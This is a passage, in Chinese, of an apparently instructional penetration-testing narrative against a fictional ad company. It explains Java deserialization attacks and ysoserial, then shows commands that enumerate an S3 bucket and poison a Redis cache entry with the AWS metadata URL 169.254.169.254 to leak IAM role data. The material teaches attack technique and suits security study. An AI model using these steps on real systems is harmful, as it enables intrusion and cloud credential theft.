
## Deserialization

当 Java 对象（或几乎任何高级语言的对象，例如 Python、C# 等）被反序列化时，它会从字节流转换回一系列属性，从而填充一个真正的 Java 对象。此过程通常由目标类的 `readObject` 方法执行。

这里有一个快速示例，展示 ads-rtb 内部可能发生的情况。在代码的某个地方，应用程序从 Redis 缓存加载字节数组并初始化输入流：

```
// Retrieve serialized object from Redis
byte[] data = FetchDataFromRedis()
// Create an input stream
ByteArrayInputStream bis = new ByteArrayInputStream(data);
```

接下来，这一串字节会被 `ObjectInputStream` 类消费，该类实现了 `readObject` 方法。此方法提取类、其签名以及静态和非静态属性，有效地将一系列字节转换为真正的 Java 对象：

```
// Create a generic Java object from the stream
ObjectInputStream ois = new ObjectInputStream(bis);
// Calling readObject of the bidRequest class to format/prepare the raw data
BidRequest objectFromRedis = (BidRequest)ois.readObject();
```

这里我们可能会找到一个入口。我们没有调用 `ObjectInputStream` 的默认 `readObject` 方法，而是调用了目标类 `BidRequest` 中定义的自定义 `readObject` 方法。

这个自定义的 `readObject` 方法几乎可以对接收到的数据做任何事情。在下一个乏味的场景中，它只是将名为 `auctionID` 的属性转为小写，但任何事情都有可能：它可以执行网络调用、读取文件，甚至执行系统命令。而且它都是基于从不受信任的序列化对象获取的输入进行的：

```
// BidRequest is a class that can be serialized
class BidRequest implements Serializable{
    public String auctionID;
    private void readObject(java.io.ObjectInputStream in){
        in.defaultReadObject();
        this.auctionID = this.auctionID.toLowerCase();
        // Perform more operations on the object attributes
    }
}
```

因此，挑战在于构造一个包含正确值并引导 `readObject` 方法的执行流程直至达到系统命令执行或其他有趣结果的序列化对象。这看起来可能像是痴心妄想，但几年前确实有几位研究人员做到了这一点。唯一的区别是，他们在 `commons-collections` 中一个类的 `readObject` 方法中发现了此漏洞，`commons-collections` 是一个随 Java 运行时环境默认提供的 Java 库（请查看 Matthias Kaiser 的演讲“Exploiting Deserialization Vulnerabilities in Java”）。

在这次演讲之后短暂的一段时间里，反序列化漏洞的数量几乎与 Windows 漏洞不相上下。真是令人难以置信！有问题的类的 `readObject` 方法已在 `commons-collections` 库的新版本中得到修复（从 3.2.2 开始），但由于调整 Java 虚拟机（JVM）通常是一个非常危险的过程，基于传说和古老智慧，许多公司抵制升级 JVM 的冲动，从而为反序列化漏洞敞开了大门。

首先，我们需要确保我们的 pod 容易受到此攻击。

如果你还记得，在第 5 章中我们遇到了似乎充当公共 JAR 文件和二进制文件私有仓库的存储桶 `mxrads-dl`。该存储桶应包含 `ads-rtb` 等应用程序使用的几乎所有外部 JAR 文件的版本。因此答案可能就在其中。我们在存储桶的键中搜索 `ysoserial` 工具（https://github.com/frohoff/ysoserial/）支持的易受攻击的 Java 库，该工具用于制作触发许多 Java 类反序列化漏洞的负载。该工具的 GitHub 页面列出了一些众所周知的可被利用的库，例如 `commons-collections` 3.1、`spring-core` 4.1.4 等。

```
root@Point1:~# aws s3api list-objects-v2 --bucket mxrads-dl > list_objects_dl.txt
root@Point1:~# grep 'commons-collections' list_objects_dl.txt
Key: jar/maven/artifact/org.apache.commons-collections/commons-collections/3.3.2
--snip--
```

我们找到了 `commons-collections` 版本 3.3.2。非常接近。我们本可以冒险进行盲目利用，希望存储桶仍在使用本地旧版本的 `commons-collections` 库，但胜算不大，所以我们继续前进。

## Cache Poisoning

我们继续探索 Redis 缓存中的其他键，希望获得一些新的灵感：

```
shell> head -100 all_redis_keys.txt
vast_c88b4ab3d_19devear
select_3799ec543582b38c
vast_c88b4ab3d_19devear
--snip--
```

我们列出键 `vast_c88b4ab3d_19devear` 的内容，这次发现了一个 URL：

```
shell> redis -h 10.59.12.47 get vast_c88b4ab3d_19devear
https://www.goodadsby.com/vast/preview/9612353
```

VAST（Video Ad Serving Template，视频广告投放模板）是用于描述向浏览器视频播放器投放广告的标准 XML 模板，包括媒体下载位置、发送哪些跟踪事件、多少秒后、发送到哪个端点等等。以下是 VAST 文件的一个示例，该文件指向存储在 `s4d.mxrads.com` 上的视频文件，广告标题为“Exotic Approach”：

```
<VAST version="3.0">
<Ad id="1594">
  <InLine>
    <AdSystem>MXR Ads revolution</AdSystem>
    <AdTitle>Exotic approach</AdTitle>
--snip--
    <MediaFile id="134130" type="video/mp4"
      bitrate="626" width="1280" height="720">
      http://s4d.mxrads.com/43ed9014730cb/12ad82436/vid/720/88b4a1cf2.mp4
--snip--
```

XML 解析器可能非常难以捉摸——标签错误，问题就会爆发。解析器会将比原始文件本身更大的堆栈跟踪输出到标准错误输出中。如此多的异常需要妥善处理……并记录！

你明白我的意思了吗？我们已经可以访问处理广告投放相关应用程序日志的 pod。如果我们用例如返回 JSON/文本格式的元数据 API URL 替换 VAST URL，应用程序是否会向我们可以查看的 Elasticsearch 审计存储发送详细的错误信息？

唯一的办法就是试试看。我们用臭名昭著的端点 URL `http://169.254.169.254/latest/meta-data/iam/info` 替换十几个有效的 VAST URL，如下所示：

```
shell> redis -h 10.59.12.47 set vast_c88b4ab3d_19devear\
http://169.254.169.254/latest/meta-data/iam/info
OK
```

此元数据端点应返回包含运行 `ads-rtb` pod 的节点所附加的 IAM 角色的 JSON 响应。我们知道该角色存在，因为 EKS 需要它。额外加分：该角色具有一些有趣的权限。
大约需要 10 分钟才会触发其中一个被污染的缓存条目，但我们最终得到了期望的详细错误。我们可以通过搜索 MXR Ads 的 AWS 账户 ID `886371554408` 在日志索引中定位该错误：
